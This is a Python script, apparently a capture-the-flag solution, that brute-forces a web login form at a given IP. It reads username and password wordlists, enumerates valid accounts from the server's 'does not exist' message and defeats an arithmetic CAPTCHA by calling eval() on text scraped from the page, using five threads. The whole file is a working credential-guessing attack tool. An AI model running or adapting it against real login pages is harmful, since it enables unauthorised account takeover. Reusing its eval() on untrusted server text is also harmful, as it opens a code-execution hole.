import argparse
import requests
import re
from concurrent.futures import ThreadPoolExecutor
import time

parser = argparse.ArgumentParser(description='Test login credentials.')
parser.add_argument('ip', type=str, help='The IP address of the target server')
args = parser.parse_args()
ip = args.ip
url = f"http://{ip}/login"

with open("usernames.txt", "rt") as fd:
    usernames = fd.read().splitlines()

with open("passwords.txt", "rt") as fd:
    passwords = fd.read().splitlines()

regex = re.compile(r"(\d+\s[+*/-]\s\d+)\s\=\s\?")
captcha_cache = {}

def send_post(username, password, captcha=None):
    data = {
        "username": username,
        "password": password,
    }
    if captcha:
        data.update({"captcha": captcha})
    response = requests.post(url=url, data=data)
    return response

def solve_captcha(response):
    captcha = re.findall(regex, response.text)[0]
    if captcha in captcha_cache:
        return captcha_cache[captcha]
    else:
        solution = eval(captcha)
        captcha_cache[captcha] = solution
        return solution

def check_credentials(username, password, captcha=None):
    response = send_post(username, password, captcha)
    captcha = solve_captcha(response)
    if "does not exist" not in response.text:
        for password in passwords:
            response = send_post(username, password, captcha)
            if "Error" not in response.text:
                print(f"Success! Username: {username} Password: {password}")
                return True
            else:
                captcha = solve_captcha(response)
            time.sleep(1)  # Delay of 1 second between requests
    return False

with ThreadPoolExecutor(max_workers=5) as executor:
    for username in usernames:
        for password in passwords:
            executor.submit(check_credentials, username, password)

